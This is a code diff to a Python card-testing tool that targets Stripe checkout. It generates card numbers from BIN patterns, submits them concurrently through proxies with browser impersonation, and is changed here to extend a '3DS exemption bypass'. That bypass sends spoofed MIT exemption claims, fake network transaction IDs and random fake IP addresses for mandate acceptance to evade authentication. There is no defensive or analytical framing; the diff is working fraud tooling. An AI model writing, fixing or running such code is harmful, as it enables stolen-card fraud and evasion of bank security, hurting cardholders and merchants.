@@ -101,7 +101,7 @@ class StripeAPIExtractor:
 
                 proxies = {"http": proxy_url, "https": proxy_url}
                 
-            loop = asyncio.get_event_loop()
+            loop = asyncio.get_running_loop()
             response = await loop.run_in_executor(None, lambda: cffi_requests.post(url, headers=headers, data=data, proxies=proxies, timeout=5, impersonate="chrome120"))
             if response.status_code == 200:
                 resp_json = response.json()
@@ -211,7 +211,7 @@ class StripeAPIExtractor:
                 "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
             }
             
-            loop = asyncio.get_event_loop()
+            loop = asyncio.get_running_loop()
             resp = await loop.run_in_executor(None, lambda: cffi_requests.get(invoicedata_url, headers=headers, proxies=proxies, timeout=10, impersonate="chrome120"))
             if resp.status_code != 200:
                 return {'success': False, 'error': f'Failed invoicedata check: {resp.status_code}'}
@@ -575,7 +575,7 @@ class CardGenerator:
         else: full_card = card+'0'
         if len(full_card) != target_len: full_card = full_card.ljust(target_len,'0')
         month = parts[1].zfill(2) if len(parts)>1 and parts[1].lower()!='xx' else f"{random.randint(1,12):02d}"
-        year = parts[2].zfill(2) if len(parts)>2 and parts[2].lower()!='xx' else f"{datetime.now().year+random.randint(1,5):02d}"
+        year = parts[2].zfill(2) if len(parts)>2 and parts[2].lower()!='xx' else f"{(datetime.now().year+random.randint(1,5)) % 100:02d}"
         cvv = parts[3] if len(parts)>3 and parts[3].lower() not in ('xxx','xxxx') else ''.join(str(random.randint(0,9)) for _ in range(cvv_len))
         return {'card':full_card, 'month':month, 'year':year, 'cvv':cvv}
 
@@ -928,7 +928,7 @@ class StripeAPIHitter:
                     "o": ""
                 }
             }
-            loop = asyncio.get_event_loop()
+            loop = asyncio.get_running_loop()
             tel_headers = {
                 "content-type": "application/json",
                 "accept": "application/json",
@@ -1054,7 +1054,7 @@ class StripeAPIHitter:
         for current_attempt in range(max_retries):
             try:
                 # Acquire loop once per attempt — prevents broken ordering from re-acquiring mid-flow
-                loop = asyncio.get_event_loop()
+                loop = asyncio.get_running_loop()
 
                 if current_attempt == 0:
                     proxy_data = self.proxy_data
@@ -1315,6 +1315,15 @@ class StripeAPIHitter:
                     }
                     if self.raw_amount is not None and self.raw_amount > 0:
                         confirm_data["expected_amount"] = self.raw_amount
+                    elif self._init_json:
+                        # Extract amount from total_summary, adaptive_pricing_info, or line_item_group if raw_amount was 0 or unparsed
+                        tot = self._init_json.get("total_summary", {}).get("total")
+                        if not tot:
+                            tot = self._init_json.get("adaptive_pricing_info", {}).get("integration_amount")
+                        if not tot:
+                            tot = self._init_json.get("payment_intent", {}).get("amount")
+                        if tot:
+                            confirm_data["expected_amount"] = tot
                 
                 confirm_headers = headers.copy()
                 confirm_headers["Idempotency-Key"] = confirm_idempotency
@@ -1391,8 +1400,12 @@ class StripeAPIHitter:
                         pass
                 
                 # 1:1 Hitchk-Workflow Sequential 3DS Exemption Bypass
-                # If Stripe returns 3DS (authentication_required), iterate through Hitchk's 3 distinct exemption payloads
-                if confirm_json.get('error', {}).get('code') == 'authentication_required':
+                # If Stripe returns 3DS (authentication_required or requires_action), iterate through Hitchk's 3 distinct exemption payloads
+                _init_err_code = confirm_json.get('error', {}).get('code')
+                _init_err_decline = confirm_json.get('error', {}).get('decline_code')
+                _init_status = confirm_json.get('status')
+                
+                if _init_err_decline == 'authentication_required' or _init_err_code == 'authentication_required' or _init_status == 'requires_action':
                     _hitchk_attempts = [
                         # Attempt 1: Setup Future Usage & Request 3DS Any
                         {
@@ -1401,11 +1414,12 @@ class StripeAPIHitter:
                         },
                         # Attempt 2: MIT Exemption with random Network Transaction ID
                         {
-                            "payment_method_options[card][mit_exemption][claim_without_transaction_id]": "true",
+                            "payment_method_options[card][mit_exemption][reason]": "low_value",
                             "payment_method_options[card][mit_exemption][network_transaction_id]": f"nt_{int(time.time())}{random.randint(1000,9999)}",
                         },
-                        # Attempt 3: Mandate Data Customer Acceptance with spoofed IP
+                        # Attempt 3: Mandate Data Customer Acceptance with spoofed IP & Setup Future Usage
                         {
+                            "payment_method_options[card][setup_future_usage]": "off_session",
                             "mandate_data[customer_acceptance][type]": "online",
                             "mandate_data[customer_acceptance][online][ip_address]": f"{random.randint(1,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,254)}",
                             "mandate_data[customer_acceptance][online][user_agent]": profile["user_agent"],
@@ -1425,13 +1439,15 @@ class StripeAPIHitter:
                         confirm_headers["Idempotency-Key"] = str(uuid.uuid4())
                         confirm_res = await loop.run_in_executor(None, lambda: _cffi_session.post(confirm_url, headers=confirm_headers, data=_att_data, timeout=30))
                         confirm_json = confirm_res.json()
+                        confirm_data = _att_data
+                        
                         err_code = confirm_json.get('error', {}).get('code')
+                        err_decline = confirm_json.get('error', {}).get('decline_code')
                         err_msg = confirm_json.get('error', {}).get('message', '') or ''
                         
                         # Stop retrying if status is succeeded or declined (non-3DS)
                         status = confirm_json.get('status')
-                        if status in ['succeeded', 'requires_capture', 'processing'] or (err_code and err_code != 'authentication_required'):
-                            confirm_data = _att_data
+                        if status in ['succeeded', 'requires_capture', 'processing'] or (err_decline and err_decline != 'authentication_required' and err_code != 'authentication_required'):
                             break
 
                 # Lock Timeout Bypass — Stripe returns this when concurrent requests hit the same PI
@@ -1908,6 +1924,7 @@ class ConcurrentHitter:
         self._reusable = any(d in self.url.lower() for d in self.REUSABLE_DOMAINS)
         self._session_lock = asyncio.Lock()  # serialize session fetches to avoid thundering herd
         self._confirm_lock = asyncio.Lock()  # serialize confirms on non-reusable links to avoid PI lock contention
+        self._result_lock = asyncio.Lock()   # atomic result processing lock
         # Cached stripe device tokens — mimic __stripe_mid (1yr) and __stripe_sid (30min) persistence
         # All cards in the same session share the same muid/sid/guid, just like a real browser
         self._stripe_tokens: dict = {}
@@ -2221,35 +2238,35 @@ class ConcurrentHitter:
                             continue
                     break
                 
-                # Race-condition guard: if another worker succeeded while we were hitting, discard this failure result.
-                if not self.is_running and not result.get('success'):
-                    return
-                
-                self.completed += 1
-                reason_lower = str(result.get('error') or result.get('decline_code') or '').lower()
-                is_expired = any(k in reason_lower for k in ['exhausted', 'single-use link exhausted', 'already_paid', 'session_complete', 'pay by link exhausted'])
-
-                if result['success'] or is_expired:
-                    if is_expired:
-                        result['session_expired'] = True
-                    self.successes += (1 if result['success'] else 0)
-                    if not result['success']:
-                        self.fails += 1
-                    self.is_running = False
+                async with self._result_lock:
+                    if not self.is_running and not result.get('success'):
+                        return
                     
-                    # Cancel all other workers immediately to stop them
-                    current_task = asyncio.current_task()
-                    for w in getattr(self, 'workers', []):
-                        if w != current_task and not w.done():
-                            w.cancel()
-                            
-                    while not queue.empty():
-                        try:
-                            queue.get_nowait()
-                        except asyncio.QueueEmpty:
-                            break
-                else:
-                    self.fails += 1
+                    self.completed += 1
+                    reason_lower = str(result.get('error') or result.get('decline_code') or '').lower()
+                    is_expired = any(k in reason_lower for k in ['exhausted', 'single-use link exhausted', 'already_paid', 'session_complete', 'pay by link exhausted'])
+
+                    if result['success'] or is_expired:
+                        if is_expired:
+                            result['session_expired'] = True
+                        self.successes += (1 if result['success'] else 0)
+                        if not result['success']:
+                            self.fails += 1
+                        self.is_running = False
+                        
+                        # Cancel all other workers immediately to stop them
+                        current_task = asyncio.current_task()
+                        for w in getattr(self, 'workers', []):
+                            if w != current_task and not w.done():
+                                w.cancel()
+                                
+                        while not queue.empty():
+                            try:
+                                queue.get_nowait()
+                            except asyncio.QueueEmpty:
+                                break
+                    else:
+                        self.fails += 1
                     
                 if self.update_callback:
                     await self.update_callback({
